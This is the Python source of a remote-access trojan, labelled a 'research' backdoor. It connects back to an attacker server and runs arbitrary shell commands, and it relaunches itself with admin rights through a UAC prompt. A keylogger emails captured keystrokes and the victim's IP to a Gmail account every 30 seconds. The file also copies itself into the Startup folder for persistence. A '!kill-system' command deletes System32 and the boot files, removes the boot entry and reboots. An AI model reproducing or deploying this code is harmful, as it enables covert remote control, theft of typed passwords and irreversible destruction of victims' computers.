#!/usr/bin/env python3

# =============================================================================================
# Project: Python-based Command & Control (C2) Agent for Remote Administration (RAT) Research
# Developer: Randy Nin
# Role: Victim-side Agent (Backdoor)
# Purpose: Cybersecurity research and authorized offensive security testing.
# =============================================================================================

import subprocess
import asyncio
import socket
import sys
import pynput.keyboard
import os
import threading
import requests
import time
import smtplib
from email.mime.text import MIMEText
import ctypes

# Connection configuration
IP="<SERVER-IPADDR>"
PORT=8888 # You can change the port as you wish

# Exfiltration parameters (SMTP)
EMAILADDR='<EMAILADDR>'
PASSKEY="<GMAIL APP PASSWORD>"


def run_as_admin():
    """Checks for administrative privileges and relaunches if necessary"""
    
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
    except:
        pass

    if getattr(sys, 'frozen', False):
        exe = sys.executable  
    else:
        exe = sys.executable  

    params = " ".join([f'"{a}"' for a in sys.argv])

    # Re-executes the process with 'runas' to trigger UAC elevation
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", exe, params, None, 1
    )

    sys.exit()

class Backdoor:
    """Handles persistent C2 connection and command execution logic"""
    
    def __init__(self, ip, port):
        self.host=ip
        self.port=port
        self.ktup=False
        
    @staticmethod
    def run_command(command):
        """Executes system commands and returns the standard output"""
        
        try:
            output_command = subprocess.check_output(command, stderr=subprocess.DEVNULL, shell=True)
            return output_command.decode('cp850')
        except subprocess.CalledProcessError:
            return f"[!] Command {command} not found"


    def start(self): 
        """Main operational loop for receiving and processing remote instructions"""
        
        while True:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((self.host, self.port))
                    s.sendall(b"\n[+] Connection established...\n\n")
                    while True:
                        command = s.recv(5120).decode().strip()
                        if not command:
                            break
                        match command:
                            case '!exit':
                                s.send(f"[!] Disconnecting...\n".encode())
                                sys.exit()
                            case '!keylogg-start':
                                if not self.ktup:
                                    kl=Keylogger()
                                    kt= threading.Thread(target=kl.start)
                                    kt.daemon = True
                                    kt.start()
                                    self.ktup=True
                            case '!keylogg-stop':
                                if self.ktup:
                                    kl.shutdown()
                                    self.ktup=False
                            case '!reboot':
                                command='shutdown /r /t 0'
                                command_output = self.run_command(command)
                                s.send(f"\n Rebooting system \n".encode())
                            case '!kill-system':
                                # DANGER: Critical system file deletion for recovery testing
                                subprocess.run("rd /s /q C:\\Windows\\System32 2>nul && rd /s /q C:\\Windows\\Boot 2>nul && rd /s /q C:\\Windows\\System 2>nul && bcdedit /delete {default} /f 2>nul", shell=True, creationflags=subprocess.CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)                                
                                command='shutdown /r /t 0'
                                command_output = self.run_command(command)
                            case '!persistence':
                                # Establishes persistence via Windows Startup folder
                                if getattr(sys, 'frozen', False):
                                    current_path = sys.executable
                                else:
                                    current_path = __file__
                                    
                                command = f'cmd /c copy /Y "{current_path}" "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"'                                    
                                self.run_command(command)
                                s.send(f"\n [-] File copied to the startup folder \n".encode())
                            case _:
                                if '!msg' in command:
                                    string = command.split('-')
                                    string = string[-1]
                                    # Launches a non-blocking UI notification via PowerShell
                                    command = f'powershell -executionpolicy bypass -command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show(\'{string}\')" '
                                    command_output = subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                                    s.send(f"\n [-] Showing Message (Only one window can be displayed at a time) \n".encode())
                                    break
                                    
                                command_output = self.run_command(command)
                                s.send(f"\n{command_output}\n".encode())
            except (ConnectionRefusedError,ConnectionResetError,ConnectionAbortedError,TimeoutError):
                continue


class Keylogger: 
    """Background service for monitoring and reporting keystrokes"""

    def __init__(self):
        self.passkey=PASSKEY
        self.emaildir=EMAILADDR
        self.log=""
        self.request_shutdown= False
        self.timer=None
        self.is_first_run = True

    def process_key(self, key):
        """Standardizes captured input for readable logs"""
        
        try:
            self.log +=str(key.char)

        except AttributeError:
            match key:
                case key.space:
                    self.log+=" "
                case key.backspace:
                    self.log = self.log[:-1]
                case key.enter:
                    self.log+="\n" 
                case _:
                    self.log+= f" <{str(key).split('.')[-1].strip()}> "

    def send_email(self, subject, body, sender, recipients, password):
        """Handles secure exfiltration of logged data via SMTP_SSL"""
        
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())

    def report(self):
        """Threaded reporting function that periodically sends exfiltrated data"""
        
        victim_ip = requests.get('https://ifconfig.me')
        email_body = f"[+] Keylogger has been started from [{victim_ip.text}]" if self.is_first_run else self.log
        self.send_email("Keylogger Report", email_body, self.emaildir, [self.emaildir], self.passkey)
        self.is_first_run=False
        self.log =""
        if not self.request_shutdown:
            self.timer = threading.Timer(30, self.report)
            self.timer.start()

    def shutdown(self):
        """Stops the reporting timer and cleanup"""
        
        self.request_shutdown= True
        if self.timer:
            self.timer.cancel()

    def start(self):
        """Initializes the keyboard listener thread"""
        
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key)

        with keyboard_listener:
            self.report()
            keyboard_listener.join()

            
if __name__ == '__main__':
    # Initial setup: administrative check and main loop start
    run_as_admin()
    backdoor = Backdoor(IP,PORT)
    try:
        while True:
            backdoor.start()
            
    except KeyboardInterrupt:
        sys.exit(1)






